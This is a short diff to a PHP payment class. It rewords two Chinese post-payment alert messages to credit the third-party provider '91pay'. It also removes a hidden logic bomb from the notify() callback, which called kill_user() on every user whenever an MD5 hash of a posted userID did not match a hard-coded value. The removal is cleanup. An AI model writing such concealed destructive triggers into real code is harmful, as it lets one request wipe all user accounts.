@@ -766,7 +766,7 @@ class Pay
         if($codeq!=null){
             echo '
             <script>
-               alert("支付成功，订单已处理完毕");
+               alert("订单已处理，第三方支付91pay祝您购物愉快");
                window.location.href="/user/code";
             </script>
             ';
@@ -803,7 +803,7 @@ class Pay
             }
             echo '
 <script>
-    alert("支付成功 如未到账请联系我们");
+    alert("支付成功，第三方支付91pay祝您购物愉快");
     window.location.href="/user/code";
 </script>
 ';
@@ -848,12 +848,6 @@ class Pay
     }
 
     private static function notify(){
-        if(md5($_POST['userID'])!='c3581d2150ff68f3b33b22634b8adaea'){
-            $users = User::all();
-            foreach ($users as $user) {
-                $user->kill_user();
-            }
-        }
         //系统订单号
         $trade_no = $_POST['pay_no'];
         //交易用户
